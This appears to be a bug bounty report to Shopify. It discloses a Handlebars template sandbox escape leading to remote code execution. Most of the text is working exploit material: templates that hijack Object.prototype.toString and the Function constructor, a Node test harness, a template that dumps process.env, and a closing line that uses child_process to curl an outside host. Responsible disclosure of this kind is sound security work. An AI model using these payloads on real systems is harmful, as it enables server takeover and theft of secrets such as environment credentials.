Hi,
I have found out that the template engine is handlebars. 
Handlebars is supposed to be a logic-less template built on top of mustache, however, I have found a way to call any function within the scope (even the Function constructor). 

The only problem I am facing right now is that whenever a function is called within the template, the template compiler sends the current scope (this) as the last parameter. 

For example if I try to call something like `constructor.constructor("test","test")`, the compiler will call it like `constructor.constructor("test", this)` and since `this` will be converted to a string then the anonymous function created will be: 
```
function anonymous(test,test){
[object Object]
} 
```
which will cause an error.

So I came up with an idea to overwrite the `Object.prototype.toString` function using `Object.defineProperty` so that it calls a function that returns a user controlled string.

And since I can't define functions using the template. All I have to do is to find a function that is already defined within the template scope and returns a user controlled input. For example, a function like this:

```
function getStoreName(){
return storeName;
}
```

Here is how my local testing for this looks like:

test.js:
```
var handlebars = require('handlebars'),
  fs = require('fs');
// StoreName is a user controlled input. The user can change his storename to whatever he wants
var storeName = "console.log(process.pid)"
function getStoreName(){
  return storeName;
}

var data = {
  getStoreName: getStoreName
}

fs.readFile('handlebars-example.html', 'utf-8', function(error, source){
  handlebars.registerHelper('custom_title', function(title, nop){
  console.log(title);
  })

  var template = handlebars.compile(source);
  var html = template(data);
  console.log(html)
});
```

handlebars-example.html:

```
{{#with this as |test|}}
{{#with (test.constructor.getOwnPropertyDescriptor this "getStoreName")}}

{{#with (test.constructor.defineProperty test.constructor.prototype "toString" this)}}

 {{#with (test.constructor.constructor "test")}} {{/with}}

{{/with}}

{{/with}}
{{/with}}
```

Now when you run `test.js` using node:
```
$ node hand.js
13193
```

Hence, sandbox is escaped and now we are able to execute any function outside the sandbox.

So all what I have to do to get this working on shopify will be to find a function defined within the scope that acts as `getStoreName` in my example (returns user controlled input). 

Here is an example that will work on shopify to prove the ability to execute functions:

To execute the following functions
```
Array.map(["xxxx", "aaaa"], String.toUpperCase, this)
String.toUpperCase("xxxx");
String.toUpperCase("aaaa");
```

We use the template
```
{{#with 1 as |test|}}
  {{#blockHelperMissing test as |testx|}} // This line will create an array and then we can access its constructor
    {{#with (testx.constructor "xxxx" "aaaaa")}}
      {{this.pop}}
      {{testx.map this.constructor.name.toUpperCase this}}
    {{/with}}
  {{/blockHelperMissing}}
{{/with}}
```

Send yourself a test email, and the response will be `XXXX,AAAAA,XXXX,AAAAA`

By the way, you might be thinking that I could use `map()` to call Function constructor on my provided input without handlebars compiler sending extra parameters, however, this won't work because map calls the constructor like this `Function(arr[i], i, arr)` which causes an error since `i` is an integer and being passed as the name of function parameter.
 `map` and friends are ill-designed in Javascript, there's no way to stop them from passing unwanted parameters :( 


## Here is an explanation of the exploit template

`{{#with this as |test|}} `
with is a helper that sets whichever assigned to it as the context, we name our context `test`.

`{{#with (test.constructor.getOwnPropertyDescriptor this "getStoreName")}}`
get the context resulted from the evaluated function, in this case, the descriptor of `this.getStoreName` where this is the template scope defined in data variable in `test.js`.

`{{#with (test.constructor.defineProperty test.constructor.prototype "toString" this)}} `
evaluate the function  test.constructor.defineProperty to overwrite `Object.prototype.toString` 

`{{#with (test.constructor.constructor "test")}}`
with will evaluate the function `test.constructor.constructor("test")` and will also evaluate whichever returned from the it which is an anonymous function:
```
function anonymous(test){
console.log(process.pid)
```

it evaluates the anonymous function because of this line on its implementation:

 ```
if (_utils.isFunction(context)) {
   context = context.call(this);
  }
```

Hi @jack_mccracken,

After A LOT OF TIME working on this, I am finally able to do RCE without depending on the template context.

Please use this as a template then send yourself a test email and you'll get `process.env`. I executed `JSON.stringify(process.env)`


```
{{#with "hola" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return JSON.stringify(process.env);"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

@jack_mccracken, I never really thought it would ever be a "bug" haha. 
By the way, it's possible to execute system commands using `process.mainModule.constructor._load('child_process').exec('curl http://[ip]:[port]/');` since `global.require` is not defined. 

